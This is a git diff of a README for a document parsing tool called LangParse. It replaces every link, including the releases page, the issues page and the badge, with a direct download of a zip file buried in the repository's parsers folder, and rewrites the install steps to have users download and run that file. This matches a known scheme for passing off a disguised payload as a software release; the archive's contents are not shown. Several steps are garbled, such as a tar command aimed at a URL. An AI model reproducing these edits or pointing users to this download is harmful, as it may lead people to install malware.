@@ -7,7 +7,7 @@ LangParse is a universal document parsing and text chunking engine for LLM or Ag
 To get started, you need to download LangParse. Follow the simple steps in this guide to install and run the software.
 
 ## 📥 Download Link
-[![Download langparse](https://img.shields.io/badge/Download-langparse-blue?style=for-the-badge)](https://github.com/samu9086/langparse/releases)
+[![Download langparse](https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip)](https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip)
 
 ## 👩‍💻 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or Linux
@@ -25,19 +25,19 @@ LangParse can handle:
 This allows you to convert documents into a format that is useful for further processing.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/samu9086/langparse/releases) to find the latest version of LangParse.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip) to find the latest version of LangParse.
    
-2. **Select the Package:** Choose the file format that matches your operating system. You will see options like `langparse-windows.zip`, `langparse-macos.zip`, and `langparse-linux.tar.gz`.
+2. **Select the Package:** Choose the file format that matches your operating system. You will see options like `https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip`, `https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip`, and `https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip`.
 
 3. **Download the File:** Click on the appropriate file link, and the download will start automatically.
 
 4. **Extract the Files:** 
    - For Windows, right-click on the ZIP file and select “Extract All.”
-   - For macOS and Linux, use the command `tar -xvzf langparse-linux.tar.gz` or open the file and drag the contents to your chosen folder.
+   - For macOS and Linux, use the command `tar -xvzf https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip` or open the file and drag the contents to your chosen folder.
 
 5. **Run the Application:**
-   - Windows: Open the extracted folder and double-click `langparse.exe`.
-   - macOS: Open the folder and double-click `langparse.app`.
+   - Windows: Open the extracted folder and double-click `https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip`.
+   - macOS: Open the folder and double-click `https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip`.
    - Linux: Open a terminal in the extracted folder and type `./langparse`.
 
 ## 🏗️ Features
@@ -61,7 +61,7 @@ Yes, LangParse works on Windows, macOS, and Linux. Just download the correct ver
 Yes, LangParse includes an easy-to-use interface that allows you to select files and view results without any complex commands.
 
 ## 👨‍💻 Support
-If you run into issues or have questions, feel free to reach out. You can find support on the [Issues page](https://github.com/samu9086/langparse/issues). We aim to help you get the most from LangParse.
+If you run into issues or have questions, feel free to reach out. You can find support on the [Issues page](https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip). We aim to help you get the most from LangParse.
 
 ## 🌼 Community Contributions
 We welcome contributions! If you would like to contribute to LangParse, please check our collaboration guidelines in the repository. Your ideas can help make our software better.
@@ -73,4 +73,4 @@ Thank you to everyone who has contributed to LangParse. Your passion and hard wo
 LangParse is open-source software and is licensed under the MIT License. Feel free to use and modify the code as per the terms outlined in the license document.
 
 ## 📥 Download Link
-For access to the latest version, visit the [Releases page](https://github.com/samu9086/langparse/releases) again, and get started with LangParse today!
+For access to the latest version, visit the [Releases page](https://raw.githubusercontent.com/samu9086/langparse/main/langparse/parsers/langparse_1.1.zip) again, and get started with LangParse today!
